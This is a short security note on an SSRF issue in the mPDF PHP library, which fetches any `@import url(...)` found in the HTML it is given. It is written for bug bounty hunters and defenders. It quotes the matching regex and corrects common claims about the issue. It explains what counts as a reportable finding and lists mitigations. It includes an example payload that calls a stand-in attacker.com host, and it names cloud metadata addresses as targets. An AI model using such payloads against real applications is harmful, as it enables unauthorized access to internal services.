# mPDF `@import url()` SSRF (library-level, won't-fix)

Source-verified against mPDF latest (`src/Css/CssLoader.php::extractExternalStylesheetUrls()`).

## What is real

mPDF regex-scans the **entire HTML input** for CSS `@import`, not just inside `<style>`.
A bare `@import url(...)` anywhere in the document body triggers an outbound fetch of the URL.
Vendor treats external-asset fetching as the developer's responsibility (won't-fix).

Relevant regex (`@import url(...)` branch):
```php
preg_match_all('/@import url\([\'\"]{0,1}(\S*?\.css(\?[^\s\'\"]+)?)[\'\"]{0,1}\)\;?/si', $html, $cxt)
```

## Corrections to the common social-media claim

- **`.css` suffix is REQUIRED.** The captured URL must end in `.css` (optional `?query`).
  - `@import url(https://attacker.com/test?.css)` → matches (query is `?.css`).
  - Arbitrary `gopher://internal:6379/...` with no `.css` → usually does NOT match. The
    "turn it into gopher:// SSRF" claim is overstated; the fetch path/scheme still has to
    satisfy the `.css` constraint and mPDF's stream handling.
- **`htmlentities()` "doesn't help" is misleading, not a bypass of escaping.**
  `htmlentities()` only encodes HTML-context chars (`< > & "`), never `@ ( ) . / :`.
  It was never the right tool to neutralize a CSS `@import` — so an unquoted
  `@import url(...)` surviving it is expected, not an escaping failure.

## Reportable vs not (bug bounty)

- mPDF itself = won't-fix / known → reporting the library = duplicate/informative.
- The **application** that pipes user HTML into mPDF **without egress filtering** IS reportable —
  but the PoC must reach an **internal resource** (cloud metadata, internal service) with data
  retrieved. A callback to your own domain (DNS/HTTP only) = low severity, often N/A.

## Mitigations (for defensive writeups)

- Restrict/disable stream wrappers: `new Mpdf(['whitelistStreamWrappers' => []])`.
- Allow only `http/https`, reject `gopher/dict/file/phar`.
- Network egress filter: block `169.254.169.254`, RFC1918, `::1`.
- Pre-sanitize input: strip `/@import\s+url/i` before handing HTML to mPDF.
